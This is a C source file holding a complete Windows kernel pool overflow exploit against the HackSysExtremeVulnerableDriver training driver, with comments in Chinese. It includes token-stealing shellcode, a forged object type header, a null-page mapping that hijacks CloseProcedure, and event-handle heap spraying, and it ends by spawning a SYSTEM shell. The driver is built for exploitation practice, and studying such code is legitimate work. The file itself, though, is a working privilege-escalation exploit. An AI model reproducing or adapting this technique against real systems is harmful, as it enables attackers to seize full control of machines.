#include<Windows.h>
#include<stdio.h>
typedef NTSTATUS(WINAPI * NtAllocateVirtualMemory_t) (HANDLE    ProcessHandle,
	PVOID     *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect);

char shellcode[] = {

	"\x90\x90\x90\x90"              // NOP Sled
	"\x60"                          // pushad
	"\x31\xc0"                      // xor eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"  // mov eax,[fs:eax+0x124]
	"\x8b\x40\x50"                  // mov eax,[eax+0x50]
	"\x89\xc1"                      // mov ecx,eax
	"\xba\x04\x00\x00\x00"          // mov edx,0x4
	"\x8b\x80\xb8\x00\x00\x00"      // mov eax,[eax+0xb8]
	"\x2d\xb8\x00\x00\x00"          // sub eax,0xb8
	"\x39\x90\xb4\x00\x00\x00"      // cmp [eax+0xb4],edx
	"\x75\xed"                      // jnz 0x1a
	"\x8b\x90\xf8\x00\x00\x00"      // mov edx,[eax+0xf8]
	"\x89\x91\xf8\x00\x00\x00"      // mov [ecx+0xf8],edx
	"\x61"                          // popad

	"\xC2\x10\x00"                  // ret 16
};

HANDLE OpenDriver() {
	HANDLE hevd = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open hevd\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to open hevd\n");
	}
	return hevd;
}

int main()
{
	char *payload = (char *)malloc(0x1f8 + 40);
	memset(payload, 'A', 0x1f8);
    /*
	kd> dd 8772cd08
    8772cd08  04080008 ee657645 00000000 00000040
    8772cd18  00000000 00000000 00000001 00000001
    8772cd28  00000000 0008000c 87420a80 00000000
    8772cd38  00040001 00000000 8772cd40 8772cd40
	*/
	// 伪造object type
	char *temp = payload + 0x1f8;
	*(PULONG)temp = (ULONG)0x04080040;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0xee657645;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000000;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000040;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000000;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000000;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000001;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000001;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00000000;
	temp = (char *)((ULONG)temp + 0x4);
	*(PULONG)temp = (ULONG)0x00080000;

	// 写入shellcode到0地址
	LPVOID ptr = VirtualAlloc(0, sizeof(shellcode), 0x3000, 0x40);
	RtlCopyMemory(ptr, shellcode, sizeof(shellcode));

	HMODULE hmodule = LoadLibraryA("ntdll.dll");

	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hmodule, "NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL) {
		wprintf(L"getprocaddress failed\n");
		return 0;
	}

	PVOID baseAddress = (PVOID)1;
	ULONG regionsize = 0x100;
	NTSTATUS status = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &baseAddress, 0, &regionsize, 0x3000, 0x40);

	if (status != 0) {
		wprintf(L"alloc failed,error code is:%u\n", status);
		return 0;
	}
	// 0x60地址处写入shellcode 位置，0x60 = 0x28(TypeInfo在_object_type中的偏移) + 0x38(CloseProcedure在TypeInfo中的偏移)
	if (!WriteProcessMemory((HANDLE)0xFFFFFFFF, (LPVOID)0x60, &ptr, 0x4, NULL)) {
		wprintf(L"write failed\n");
		return 0;
	}

	// 堆风水
	int i = 0;
	int j = 0;
	HANDLE spray1[10000];
	HANDLE spray2[5000];

	for (i = 0; i < 10000; i++) {
		spray1[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
	}
	for (i = 0; i < 5000; i++) {
		spray2[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
	}

	for (i = 0; i < (sizeof(spray2) / sizeof(HANDLE)); i = i + 16) {
		for (j = 0; j < 8; j++) {
			CloseHandle(spray2[i + j]);
		}
	}

	// 触发shellcode
	HANDLE hevd = OpenDriver();
	DWORD lpBytesReturned = 0;
	DeviceIoControl(hevd, 0x22200f, payload, 0x1f8 + 40, NULL, 0, &lpBytesReturned, NULL);

	for (i = 8; i < (sizeof(spray2) / sizeof(HANDLE)); i = i + 16) {
		for (j = 0; j < 8; j++) {
			CloseHandle(spray2[i + j]);
		}
	}

	for (i = 0; i < 10000; i++) {
		CloseHandle(spray1[i]);
	}
	system("cmd.exe");
	return 0;
}
